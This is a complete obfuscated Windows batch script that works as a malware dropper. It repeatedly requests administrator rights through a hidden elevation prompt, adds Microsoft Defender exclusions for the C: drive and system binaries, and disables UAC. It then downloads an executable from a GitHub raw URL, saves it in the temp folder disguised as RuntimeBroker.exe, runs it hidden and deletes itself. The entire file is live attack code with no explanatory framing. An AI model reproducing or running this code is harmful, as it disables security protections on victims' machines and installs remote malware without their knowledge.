@echo off & setlocal enableDelayedExpansion
set "GXS=NET" & set "goqE=2>&1" & set "gSzp=SESSION" & set "UQCK=>nul"
%GXS% %gSzp% %UQCK% %goqE%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "kRg=foo" & set "iYpl=baz" & set "UYT=qux" & set "pKwkn=bar" & rem XCqgibX XNmC lKQ
set "WioC=powershell -ExecutionPolicy Bypass -Command"
set "gZo=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "NOQt='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "VRx='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!WioC! "!gZo! !NOQt! !VRx!" %UQCK% %goqE%
set "JmqSi=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "sEb=-Name 'EnableLUA' -Value 0"
!WioC! "!JmqSi! !sEb!" %UQCK% %goqE%
set "inEtX=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!WioC! "!inEtX!" %UQCK% %goqE%
if !errorlevel! neq 0 (goto %a%)
set "kFui=timeout /t" & !kFui! 2 %UQCK% %goqE%
set "grxO=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "uxP=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "QbKH=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!WioC! "!grxO! !uxP! !QbKH!" %UQCK% %goqE%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!kFui! 1 %UQCK% %goqE% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %UQCK% %goqE%
del /f /q "%~f0" %UQCK% %goqE%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %UQCK% %goqE%
if !errorlevel! neq 0 (!kFui! 3 %UQCK% %goqE% & goto %b%)
exit /b
